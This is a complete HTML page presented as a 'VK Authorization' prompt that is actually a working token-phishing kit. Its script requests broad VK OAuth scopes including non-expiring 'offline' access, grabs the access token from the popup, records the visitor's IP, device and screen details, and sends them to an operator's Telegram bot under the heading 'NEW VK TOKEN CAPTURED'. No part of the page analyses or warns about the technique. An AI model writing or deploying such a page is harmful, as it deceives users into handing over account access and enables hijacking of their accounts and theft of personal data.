<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VK Authorization</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #4A76A8 0%, #2A4A6E 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: #4A76A8;
            border-radius: 20px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            font-weight: bold;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .btn {
            background: linear-gradient(135deg, #4A76A8 0%, #2A4A6E 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4A76A8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            display: none;
            color: #4CAF50;
            margin-top: 20px;
        }
        .error {
            display: none;
            color: #f44336;
            margin-top: 20px;
        }
    </style>
    <script src="config.js"></script>
</head>
<body>
    <div class="container" id="container">
        <div class="logo">VK</div>
        <h1>VK Authorization Required</h1>
        <p>Please authorize this application to access your VK account. This is required to continue.</p>
        
        <button class="btn" onclick="startAuth()" id="authBtn">
            üîê Authorize with VK
        </button>
        
        <div class="loading" id="loading">
            <div class="loader"></div>
            <p style="margin-top: 10px;">Processing authorization...</p>
        </div>
        
        <div class="success" id="success">
            <h2>‚úÖ Authorization Successful!</h2>
            <p>You can now close this window.</p>
        </div>
        
        <div class="error" id="error">
            <h2>‚ùå Authorization Failed</h2>
            <p id="errorMsg"></p>
        </div>
    </div>

    <script>
        // –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è
        let authWindow = null;
        let tokenReceived = false;
        
        // –ü–æ–∫–∞–∑–∞—Ç—å/—Å–∫—Ä—ã—Ç—å —ç–ª–µ–º–µ–Ω—Ç—ã
        function showElement(id) {
            document.getElementById(id).style.display = 'block';
        }
        function hideElement(id) {
            document.getElementById(id).style.display = 'none';
        }
        
        // –ù–∞—á–∞—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é
        function startAuth() {
            console.log('Starting VK authorization...');
            
            // –ü–æ–∫–∞–∑–∞—Ç—å –∑–∞–≥—Ä—É–∑–∫—É
            hideElement('authBtn');
            showElement('loading');
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            saveUserData();
            
            // –ü–∞—Ä–∞–º–µ—Ç—Ä—ã –¥–ª—è VK OAuth
            const params = {
                client_id: CONFIG.VK_CLIENT_ID,
                redirect_uri: CONFIG.REDIRECT_URI,
                display: 'popup',
                scope: 'friends,photos,audio,video,wall,groups,offline',
                response_type: 'token',
                v: '5.199',
                state: 'auth_' + Date.now(),
                revoke: '0'
            };
            
            // –°–æ–±–∏—Ä–∞–µ–º URL
            const authUrl = 'https://oauth.vk.com/authorize?' + 
                Object.keys(params)
                    .map(key => `${key}=${encodeURIComponent(params[key])}`)
                    .join('&');
            
            console.log('Auth URL:', authUrl);
            
            // –û—Ç–∫—Ä—ã–≤–∞–µ–º –≤ popup –æ–∫–Ω–µ
            authWindow = window.open(
                authUrl,
                'VK Auth',
                'width=600,height=700,scrollbars=yes,status=yes'
            );
            
            if (!authWindow) {
                showError('Please allow popups and try again');
                return;
            }
            
            // –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä—è—Ç—å popup –æ–∫–Ω–æ
            checkAuthWindow();
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ popup –æ–∫–Ω–∞
        function checkAuthWindow() {
            const checkInterval = setInterval(() => {
                if (authWindow.closed) {
                    clearInterval(checkInterval);
                    
                    if (!tokenReceived) {
                        // –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–∫—Ä—ã–ª –æ–∫–Ω–æ
                        hideElement('loading');
                        showElement('authBtn');
                        showError('Authorization window was closed');
                    }
                }
                
                // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å URL popup –æ–∫–Ω–∞
                try {
                    const popupUrl = authWindow.location.href;
                    
                    if (popupUrl.includes('access_token=')) {
                        clearInterval(checkInterval);
                        processPopupUrl(popupUrl);
                        authWindow.close();
                    }
                } catch (e) {
                    // Cross-origin error, –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º
                }
            }, 500);
            
            // –¢–∞–π–º–∞—É—Ç 2 –º–∏–Ω—É—Ç—ã
            setTimeout(() => {
                if (!tokenReceived) {
                    clearInterval(checkInterval);
                    if (authWindow) authWindow.close();
                    hideElement('loading');
                    showElement('authBtn');
                    showError('Authorization timeout');
                }
            }, 120000);
        }
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ URL –∏–∑ popup
        function processPopupUrl(url) {
            console.log('Processing popup URL:', url);
            
            // –ò–∑–≤–ª–µ–∫–∞–µ–º —Ç–æ–∫–µ–Ω –∏–∑ URL
            let hash = '';
            
            if (url.includes('#')) {
                hash = url.split('#')[1];
            } else if (url.includes('access_token=')) {
                const urlObj = new URL(url);
                hash = urlObj.searchParams.toString();
            }
            
            const params = new URLSearchParams(hash);
            const token = params.get('access_token');
            const userId = params.get('user_id');
            const expires = params.get('expires_in');
            const error = params.get('error');
            
            if (error) {
                showError('VK Error: ' + params.get('error_description'));
                return;
            }
            
            if (token) {
                console.log('Token found!');
                tokenReceived = true;
                sendTokenToTelegram(token, userId, expires);
            } else {
                showError('Token not found in URL');
            }
        }
        
        // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function saveUserData() {
            const data = {
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                referrer: document.referrer
            };
            
            // –ü–æ–ª—É—á–∞–µ–º IP
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipData => {
                    data.ip = ipData.ip;
                    localStorage.setItem('vk_user_data', JSON.stringify(data));
                    sendTelegramNotification('start', data);
                })
                .catch(() => {
                    data.ip = 'Unknown';
                    localStorage.setItem('vk_user_data', JSON.stringify(data));
                    sendTelegramNotification('start', data);
                });
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–æ–∫–µ–Ω–∞ –≤ Telegram
        async function sendTokenToTelegram(token, userId, expires) {
            console.log('Sending token to Telegram...');
            
            // –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            const userData = JSON.parse(localStorage.getItem('vk_user_data') || '{}');
            
            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ VK
            let vkUserInfo = '';
            try {
                const vkResponse = await fetch(`https://api.vk.com/method/users.get?user_ids=${userId}&fields=first_name,last_name,photo_100&access_token=${token}&v=5.199`);
                const vkData = await vkResponse.json();
                
                if (vkData.response && vkData.response[0]) {
                    const user = vkData.response[0];
                    vkUserInfo = `üë§ <b>${user.first_name} ${user.last_name}</b>\n`;
                }
            } catch (e) {
                console.log('Could not get VK user info');
            }
            
            // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
            const message = `‚úÖ <b>NEW VK TOKEN CAPTURED</b>\n\n` +
                           `${vkUserInfo}` +
                           `üÜî <b>User ID:</b> <code>${userId}</code>\n` +
                           `üîë <b>Access Token:</b>\n<code>${token}</code>\n` +
                           `‚è±Ô∏è <b>Expires in:</b> ${expires || '‚àû'} seconds\n\n` +
                           `üì° <b>Device Info:</b>\n` +
                           `üìç IP: <code>${userData.ip || 'Unknown'}</code>\n` +
                           `üì± Platform: ${userData.platform}\n` +
                           `üåê Language: ${userData.language}\n` +
                           `üñ•Ô∏è Screen: ${userData.screen}\n` +
                           `üïí Time: ${new Date(userData.timestamp).toLocaleString('ru-RU')}\n\n` +
                           `üîó <b>Token Check:</b>\n` +
                           `https://api.vk.com/method/users.get?access_token=${token}&v=5.199\n\n` +
                           `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                
                const result = await response.json();
                console.log('Telegram response:', result);
                
                if (result.ok) {
                    // –£—Å–ø–µ—Ö!
                    hideElement('loading');
                    showElement('success');
                    
                    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ localStorage –¥–ª—è –∏—Å—Ç–æ—Ä–∏–∏
                    const tokenData = {
                        token: token,
                        userId: userId,
                        expires: expires,
                        capturedAt: new Date().toISOString()
                    };
                    localStorage.setItem('last_vk_token', JSON.stringify(tokenData));
                    
                } else {
                    showError('Failed to send to Telegram: ' + result.description);
                }
                
            } catch (e) {
                console.error('Telegram error:', e);
                showError('Connection error to Telegram');
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤ Telegram
        async function sendTelegramNotification(type, data) {
            let message = '';
            
            if (type === 'start') {
                message = `üöÄ <b>AUTHORIZATION STARTED</b>\n\n` +
                         `üìç IP: <code>${data.ip}</code>\n` +
                         `üì± Device: ${data.platform}\n` +
                         `üñ•Ô∏è Screen: ${data.screen}\n` +
                         `üåê Language: ${data.language}\n` +
                         `üïí Time: ${new Date(data.timestamp).toLocaleString('ru-RU')}\n` +
                         `‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê`;
            }
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error('Telegram notification error:', e);
            }
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –æ—à–∏–±–∫—É
        function showError(message) {
            hideElement('loading');
            showElement('error');
            document.getElementById('errorMsg').textContent = message;
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ URL –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ (–Ω–∞ —Å–ª—É—á–∞–π –ø—Ä—è–º–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ —Å —Ç–æ–∫–µ–Ω–æ–º)
        window.onload = function() {
            const url = window.location.href;
            
            if (url.includes('access_token=')) {
                console.log('Token found in main window URL');
                processPopupUrl(url);
            }
        };
    </script>
</body>
</html>
